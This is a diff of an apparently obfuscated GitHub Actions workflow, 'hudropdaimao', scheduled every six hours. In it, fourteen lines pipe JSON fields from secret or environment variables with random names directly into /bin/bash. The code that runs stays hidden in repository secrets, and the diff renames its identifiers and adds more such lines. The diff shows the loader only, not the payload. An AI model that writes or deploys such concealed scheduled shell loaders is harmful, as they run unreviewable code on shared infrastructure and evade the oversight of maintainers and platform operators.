@@ -1,21 +1,31 @@
 name: hudropdaimao
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 1/6 * * *'
-jobs:  # 23622
+    - cron: '22 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: hudropdaimao
         env:
-          fhb417: ${{ secrets.fhb417 }}
+          n03653: ${{ secrets.n03653 }}
         run: |
-          echo $fhb417 | jq -r .ah583 | /bin/bash
-          echo $kbkxb9085 | jq -r .g95 | /bin/bash
-          echo $oqq77926 | jq -r .mpvqu0629 | /bin/bash
-          echo $or6749 | jq -r .qq0 | /bin/bash
-          echo $ppaf20682 | jq -r .iy5 | /bin/bash
+          echo $n03653 | jq -r .lx05318 | /bin/bash
+          echo $skl978 | jq -r .mrc4 | /bin/bash
+          echo $gdu429 | jq -r .an60 | /bin/bash
+          echo $srfq94765 | jq -r .p4 | /bin/bash
+          echo $rwpk3 | jq -r .iadtm694 | /bin/bash
+          echo $g67 | jq -r .xrtb45 | /bin/bash
+          echo $flog4171 | jq -r .mange59773 | /bin/bash
+          echo $ppakq99070 | jq -r .wodsd3 | /bin/bash
+          echo $ejrl62 | jq -r .dvrt272 | /bin/bash
+          echo $vzz7283 | jq -r .uilq19483 | /bin/bash
+          echo $zb724 | jq -r .qxo4 | /bin/bash
+          echo $yh47 | jq -r .jrlrv717 | /bin/bash
+          echo $m65 | jq -r .ofp886 | /bin/bash
+          echo $ijco01 | jq -r .ejh1 | /bin/bash
 
